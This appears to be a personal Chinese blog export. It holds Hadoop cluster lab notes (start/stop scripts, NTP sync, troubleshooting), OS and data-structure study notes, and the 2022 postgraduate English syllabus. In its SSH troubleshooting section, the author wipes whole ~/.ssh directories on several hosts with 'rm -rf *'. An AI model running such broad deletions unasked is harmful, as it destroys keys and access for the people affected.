<h3 id="集群启动和停止方式"><a href="#集群启动和停止方式" class="headerlink" title="集群启动和停止方式"></a>集群启动和停止方式</h3><h4 id="各个模块分开启动-x2F-停止（配置ssh是前提）常用"><a href="#各个模块分开启动-x2F-停止（配置ssh是前提）常用" class="headerlink" title="各个模块分开启动&#x2F;停止（配置ssh是前提）常用"></a>各个模块分开启动&#x2F;停止（配置ssh是前提）常用</h4><p>1.整体启动&#x2F;停止HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.整体启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="各个服务逐一启动-x2F-停止"><a href="#各个服务逐一启动-x2F-停止" class="headerlink" title="各个服务逐一启动&#x2F;停止"></a>各个服务逐一启动&#x2F;停止</h4><p>1.分别启动&#x2F;停止HDFS组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.启动&#x2F;停止YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="编写Hadoop集群常用脚本"><a href="#编写Hadoop集群常用脚本" class="headerlink" title="编写Hadoop集群常用脚本"></a>编写Hadoop集群常用脚本</h3><h4 id="Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh"><a href="#Hadoop-集群启停脚本-包含-HDFS，Yarn，Historyserver-myhadoop-sh" class="headerlink" title="Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh"></a>Hadoop 集群启停脚本(包含 HDFS，Yarn，Historyserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>文件内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== 启动 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 启动 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- 启动 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- 启动 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== 关闭 hadoop 集群 ===================&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- 关闭 yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- 关闭 hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">赋予脚本执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp myhadoop.sh /bin/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="查看三台服务器Java进程脚本：jpsall"><a href="#查看三台服务器Java进程脚本：jpsall" class="headerlink" title="查看三台服务器Java进程脚本：jpsall"></a>查看三台服务器Java进程脚本：jpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp jpsall /bin/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发脚本</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="常用端口号"><a href="#常用端口号" class="headerlink" title="常用端口号"></a>常用端口号</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115386.png" alt="image-20210628130455175"></p>
<h3 id="集群内时间同步"><a href="#集群内时间同步" class="headerlink" title="集群内时间同步"></a>集群内时间同步</h3><p>如果服务器在公网环境(能连接外网)，可以不采用集群时间同步，因为服务器会定期 和公网时间进行校准;</p>
<p>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差， 导致集群执行任务时间不同步。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境根据任务对时间的准确程度要求周期同步。测试环境为了尽快看到效果，采用 1 分钟同步一 次。</p>
<h4 id="时间服务器配置（必须root用户）"><a href="#时间服务器配置（必须root用户）" class="headerlink" title="时间服务器配置（必须root用户）"></a>时间服务器配置（必须root用户）</h4><p>1.查看所有节点 ntpd 服务状态和开机自启动状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.修改hadoop102的ntp.conf配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">授权 192.168.58.0-192.168.58.255 网段上的所有机器可以从这台机器上查询和同步时间</span></span><br><span class="line">restrict 192.168.58.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">集群在局域网中不使用其他互联网上的时间，下面4个都注释掉</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 不是IP 地址。 它是一种格式，用来引用向服务器提供准确时间的时钟。</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">增加内容如下（让硬件时间与系统时间一起同步）</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">设置开机自启</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br></pre></td></tr></table></figure>

<p>3.其他机器配置（必须root用户,已hadoop103为例）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[huang@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ sudo crontab -e</span><br><span class="line"><span class="meta">#</span><span class="language-bash">编写内容如下</span></span><br><span class="line">*/1 * * * * /usr/sbin/ntpdate hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">任意修改机器时间</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date -s &quot;2021-9-9 11:11:11&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">一分钟后查看</span></span><br><span class="line">[huang@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure>

<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><h2 id="jpsall脚本查看9个服务器的状态"><a href="#jpsall脚本查看9个服务器的状态" class="headerlink" title="jpsall脚本查看9个服务器的状态"></a>jpsall脚本查看9个服务器的状态</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115387.png" alt="image-20210701175214061"></p>
<p>与集群规划一致：</p>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h2 id="9个节点均为激活状态"><a href="#9个节点均为激活状态" class="headerlink" title="9个节点均为激活状态"></a>9个节点均为激活状态</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115388.png" alt="截屏2021-07-01 下午5.59.03 (2)"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115389.png" alt="截屏2021-07-01 下午6.00.51 (2)"></p>
<h2 id="节点副本数设置为9"><a href="#节点副本数设置为9" class="headerlink" title="节点副本数设置为9"></a>节点副本数设置为9</h2><p>此时副本数为9个</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115390.png" alt="截屏2021-07-01 下午6.02.08 (2)"></p>
<h2 id="执行wordcount"><a href="#执行wordcount" class="headerlink" title="执行wordcount"></a>执行wordcount</h2><p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115391.png" alt="image-20210701182926457"></p>
<p>执行：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115392.png" alt="截屏2021-07-01 下午6.07.43 (2)"></p>
<p>查看结果：</p>
<p>任务历史：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115393.png" alt="截屏2021-07-01 下午6.11.54 (2)"></p>
<p>日志：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115394.png" alt="截屏2021-07-01 下午6.12.27 (2)"></p>
<p>结果3个副本在hadoop106，hadoop109，hadoop5:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115395.png" alt="截屏2021-07-01 下午6.20.19 (2)"></p>
<p>去hadoop105,hadoop106,hadoop109查看：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115396.png" alt="截屏2021-07-01 下午6.27.12 (2)"></p>
<h2 id="四、实验遇到的问题及解决方法"><a href="#四、实验遇到的问题及解决方法" class="headerlink" title="四、实验遇到的问题及解决方法"></a>四、实验遇到的问题及解决方法</h2><h2 id="ssh连不上"><a href="#ssh连不上" class="headerlink" title="ssh连不上"></a>ssh连不上</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115397.png" alt="截屏2021-07-01 下午2.16.19"></p>
<p>原因：之前在本地配置过ssh无密码登陆，现在ip地址变了，之前的hadoop103已经换了主机，所以才会等不上</p>
<p>解决方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">把.ssh文件夹下的东西都删掉</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">mac</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro Documents % cd /Users/huangmingwang/.ssh </span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro .ssh % rm -rf known_hosts </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop102</span></span><br><span class="line">[huang@hadoop102 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop103</span></span><br><span class="line">[huang@hadoop103 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop103 .ssh]$ rm -rf *</span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop104</span></span><br><span class="line">[huang@hadoop104 ~]$ cd .ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br><span class="line"></span><br><span class="line">[huang@hadoop104 ~]$ cd /home/huang/.ssh</span><br><span class="line">[huang@hadoop104 .ssh]$ rm -rf *</span><br></pre></td></tr></table></figure>



<h2 id="Hadoop102-root账号无密码登陆其他主机失败"><a href="#Hadoop102-root账号无密码登陆其他主机失败" class="headerlink" title="Hadoop102 root账号无密码登陆其他主机失败"></a>Hadoop102 root账号无密码登陆其他主机失败</h2><p>原因：在&#x2F;home&#x2F;huang&#x2F;.ssh配置的无密码登陆，在root用户下用不了</p>
<p>解决方法：</p>
<p>在进去root根目录下的.ssh进行配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 huang]$ cd /root/.ssh</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br></pre></td></tr></table></figure>

<h3 id="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"><a href="#修改配置后重启服务发现DataNode和NameNode进程只能重启一个" class="headerlink" title="修改配置后重启服务发现DataNode和NameNode进程只能重启一个"></a>修改配置后重启服务发现DataNode和NameNode进程只能重启一个</h3><p>因为NameNode在format初始化后会生成clusterId（集群ID），DateNode在启动后会生成和NameNode一样的clusterId（集群ID），再次格式化NameNode，生成新的clusterid，与未删除DataNode的clusterid不一致，集群找不到已往数据。</p>
<p>解决方法：</p>
<p>需要重新格式化 NameNode 的话，<strong>一定要先停止所有机器的NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。</p>
<h2 id="xsync脚本只能同步修改，不能删除文件夹"><a href="#xsync脚本只能同步修改，不能删除文件夹" class="headerlink" title="xsync脚本只能同步修改，不能删除文件夹"></a>xsync脚本只能同步修改，不能删除文件夹</h2><p>hdfs启动失败后，在hadoop上删除data和logs，然后用xsync同步文件夹，本以为其他主机也会同步删除，然后又接着格式NameNode，重启集群，但还是有几个datanode连不上，因为其他节点的data数据还在，造成格式化后集群id不一样，然后连不上</p>
<p>解决方案：</p>
<p>去每个节点上删除data和logs文件夹，然后再格式化NameNode，重启集群即可</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统</title>
    <url>/2021/09/21/%E8%80%83%E7%A0%94/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h3 id="多任务操作系统具有并发性和并行性"><a href="#多任务操作系统具有并发性和并行性" class="headerlink" title="多任务操作系统具有并发性和并行性"></a>多任务操作系统具有并发性和并行性</h3><p>多任务操作系统中，cpu与外部设备并行工作，cpu与内存并发工作。所以说他有并发和并行的特点。</p>
<p>要注意区分不同语境下“并行”所描述的对象。</p>
<p>在说明操作系统特点时，我们说，单CPU的操作系统具有并发性而不具有并行性，在这里，“并行”描述的是进程之间的关系，单CPU操作系统无法真正同时运行多个进程，而只能从微观上分时交替地运行多个进程，符合并发却称不上并行。</p>
<p>而这里在说明多任务操作系统的特点时，“并行”指的是多个任务的关系而非多个进程的关系。虽然多进程在单CPU系统无法并行，但是多任务却可以，比如，任务A是执行算术运算，它占用CPU，任务B是执行I&#x2F;O，它不占用CPU，因此这两个任务是可以并行的，此即单CPU多任务操作系统的并行性。</p>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>408</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/2021/12/21/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h2><p><a href="https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1gJ411u7JF?from=search&amp;seid=15373464297409923473&amp;spm_id_from=333.337.0.0</a></p>
<h3 id="多路归并排序"><a href="#多路归并排序" class="headerlink" title="多路归并排序"></a>多路归并排序</h3><p>外部排序指的是大文件的排序，即待排序的记录存储在外存储器上，待排序的文件无法一次装入内存，需要在内存和外部存储器之间进行多次数据交换，以达到排序 整个文件的目的。外部排序最常用的算法是多路归并排序，即将原文件分解成多个能够一次性装入内存的部分，分别把每一部分调入内存完成排序。然后，对已经排序的子文件进行多路归并排序。</p>
<p>缺点：每个数字需要两次io，于是就有了选择置换排序来减少io</p>
<p>题目：</p>
<p>若外部存储上有3110400个记录，做6路平衡归并排序，计算机内存工作区能容纳400个记录，则排序好所有记录，需要作几趟归并排序（ ）</p>
<p>答案：5</p>
<p>log(6,3110400&#x2F;400) &#x3D; 5</p>
<h3 id="选择置换排序（用来构造初始归并段）"><a href="#选择置换排序（用来构造初始归并段）" class="headerlink" title="选择置换排序（用来构造初始归并段）"></a>选择置换排序（用来构造初始归并段）</h3><ul>
<li>先将内存放满，然后取出一个最小的，接着从外存中放入一个，然后再取出一个最小的（可以考虑用堆排序）</li>
<li>直到内存中最小的比外存中最大的小，然后就把内存中这个标记一下，继续取第二小的，直到内存中最大的比外存中最大的小，一趟排序结束，此时外存的为初始归并段，相比于多路归并排序来说，这个选归并段省去了多次io。</li>
<li>接着和之前一样的步骤，最后会得到多个归并段</li>
<li>然后使用多路归并排序来排序</li>
</ul>
<p>缺点：归并段的长度不一致， 怎么选择归并段会影响io次数，于是就有了最佳归并数来选择最佳的归并序列</p>
<h3 id="最佳归并树"><a href="#最佳归并树" class="headerlink" title="最佳归并树"></a>最佳归并树</h3><p>类似于哈夫曼树</p>
<h3 id="败者树"><a href="#败者树" class="headerlink" title="败者树"></a>败者树</h3><p>在内存中的数选出一个最小的（频繁执行），可以使用堆，但是败者树更好用。</p>
<p>用堆的话每次调整之后不好记录这个数是舒服几个归并段的，而败者树不会。</p>
<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><h3 id="红黑树（RB-tree）比AVL树的优势在哪？"><a href="#红黑树（RB-tree）比AVL树的优势在哪？" class="headerlink" title="红黑树（RB-tree）比AVL树的优势在哪？"></a>红黑树（RB-tree）比AVL树的优势在哪？</h3><p>红黑树的特性:<br>（1）每个节点或者是黑色，或者是红色。<br>（2）根节点是黑色。<br>（3）每个叶子节点（NIL）是黑色。 [注意：这里叶子节点，是指为空(NIL或NULL)的叶子节点！]<br>（4）如果一个节点是红色的，则它的子节点必须是黑色的。<br>（5）从一个节点到该节点的子孙节点的所有路径上包含相同数目的黑节点。</p>
<p>定理：<strong>一棵含有n个节点的红黑树的高度至多为2log(n+1)</strong>.</p>
<p>首先红黑树是不符合AVL树的平衡条件的，即每个节点的左子树和右子树的高度最多差1的二叉查找树。但是提出了为节点增加颜色，红黑是用非严格的平衡来换取增删节点时候旋转次数的降低，任何不平衡都会在三次旋转之内解决，而AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多。所以红黑树的插入效率更高！！！</p>
<p>红黑树的查询性能略微逊色于AVL树，因为他比avl树会稍微不平衡最多多一层，也就是说红黑树的查询性能只比相同内容的avl树最多多一次比较，但是，红黑树在插入和删除上完爆avl树， avl树每次插入删除会进行大量的平衡度计算，而红黑树为了维持红黑性质所做的红黑变换和旋转的开销，相较于avl树为了维持平衡的开销要小得多 </p>
<p>所以简单说，如果你的应用中，搜索的次数远远大于插入和删除，那么选择AVL，如果搜索，插入删除次数几乎差不多，应该选择RB。</p>
<h3 id="面试之Trie树特点和应用场景"><a href="#面试之Trie树特点和应用场景" class="headerlink" title="面试之Trie树特点和应用场景"></a>面试之Trie树特点和应用场景</h3><p>优点：</p>
<ol>
<li><p>Trie进行对某个string查找的时间复杂度为O(m)，m为string中字符个数。相比较，BST（二叉搜索树）的时间复杂度是O(logN），在树不平衡的情况下，为O(N)；</p>
</li>
<li><p>利用字符串的公共前缀来减少查询时间，最大限度的减少无谓的字符串比较，查询效率比哈希树高。</p>
</li>
<li><p>Trie可以生成以字母顺序排序的键值对集合</p>
</li>
<li><p>自带排序功能</p>
</li>
</ol>
<p>缺点：</p>
<ol>
<li><p>Trie在搜索效率上可能会比Hash慢。</p>
</li>
<li><p>有些键（key），例如浮点数，有很长的前序节点，可能会导致内存过大或者搜索效率下降。虽然bitwise trie可以处理这种情况，但需要针对特定的情境编写多余的代码。</p>
</li>
<li><p>在空间复杂度上，Trie的开销可能会多于Hashtable申请的内存。Trie的每一个节点可能会有多个孩子（例如每个节点最多可能有a-z 26个孩子），这个多层的Trie对内存开销很大。</p>
</li>
</ol>
<p>Trie的应用场景</p>
<ol>
<li><p>保存一本字典，英文字典大约只有50,000个单词，并且Trie还演化出来一种叫做<a href="http://en.wikipedia.org/wiki/Directed_acyclic_word_graph">Directed acyclic word graph</a>的东西，它将后缀一样的字符串也进行了压缩，所以空间利用率有了进一步提高。所以Trie在空间利用率上不会比Binary Search Tree差太多。</p>
</li>
<li><p>根据保存的字典，可以预测用户输入内容</p>
</li>
<li><p>断词和拼写查错软件也运用了Trie – spellings&#x2F;suggestions&#x2F;type-ahead-lookup&#x2F;auto-completion&#x2F;<br>这些应用场景都有一个特点，就是不是单独地查询一个词，而是获取以有一定字母顺序的一组字符串</p>
</li>
</ol>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年考研英语二考试大纲</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94%E8%8B%B1%E8%AF%AD%E4%BA%8C%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022年考研英语二考试大纲"><a href="#2022年考研英语二考试大纲" class="headerlink" title="2022年考研英语二考试大纲"></a>2022年考研英语二考试大纲</h1><blockquote>
<p>叶纯宝宝专用版</p>
</blockquote>
<p><strong>全国硕士研究生招生考试英语(二)考试大纲(非英语专业)(2022年版)</strong></p>
<h2 id="I-考试性质"><a href="#I-考试性质" class="headerlink" title="I.考试性质"></a><strong>I.考试性质</strong></h2><p>英语(二)考试主要是为高等院校和科研院所招收专业学位硕士研究生而设置的具有选拔性质的全国统一入学考试科目。其目的是科学、公平、有效地测试考生对英语语言的运用能力，评价的标准是高等学校非英语专业本科毕业生所能达到的及格或及格以上水平，以保证被录取者具有一定的英语水平，并有利于各高等学校和科研院所在专业上择优选拔。</p>
<h2 id="II-考查目标"><a href="#II-考查目标" class="headerlink" title="II.考查目标"></a><strong>II.考查目标</strong></h2><p>考生应掌握下列语言知识和技能：</p>
<h3 id="一-语言知识"><a href="#一-语言知识" class="headerlink" title="(一)语言知识"></a>(一)语言知识</h3><p>1.语法知识</p>
<p>考生应能熟练地运用基本的语法知识，其中包括：</p>
<p>(1)名词、代词的数和格的构成及其用法;</p>
<p>(2)动词时态、语态的构成及其用法;</p>
<p>(3)形容词与副词的比较级和最高级的构成及其用法;</p>
<p>(4)常用连接词的词义及其用法;</p>
<p>(5)非谓语动词(不定式、动名词、分词)的构成及其用法;</p>
<p>(6)虚拟语气的构成及其用法;</p>
<p>(7)各类从句(定语从句、主语从句、表语从句等)及强调句型的结构及其用法;</p>
<p>(8)倒装句、插入语的结构及其用法。</p>
<p>2.词汇</p>
<p>考生应能较熟练地掌握5500个左右常用英语词汇以及相关常用词组(详见附录相关部分)。考生应能根据具体语境、句子结构或上下文理解一些非常用词的词义。</p>
<h3 id="二-语言技能"><a href="#二-语言技能" class="headerlink" title="(二)语言技能"></a>(二)语言技能</h3><p>1.阅读</p>
<p>考生应能读懂不同题材和体裁的文字材料。题材包括经济、管理、社会、文化、科普等，体裁包括说明文、议论文和记叙文等。</p>
<p>根据阅读材料，考生应能：</p>
<p>(1)理解主旨要义;</p>
<p>(2)理解文中的具体信息;</p>
<p>(3)理解语篇的结构和上下文的逻辑关系;</p>
<p>(4)根据上下文推断重要生词或词组的含义;</p>
<p>(5)进行一定的判断和推理;</p>
<p>(6)理解作者的意图、观点或态度;</p>
<p>(7)理解文章的论证方法，比较不同观点。</p>
<p>2.写作</p>
<p>考生应能根据所给的提纲、情景或要求完成相应的短文写作。短文应中心思想明确、切中题意、结构清晰、条理清楚、用词恰当、无明显语言错误。</p>
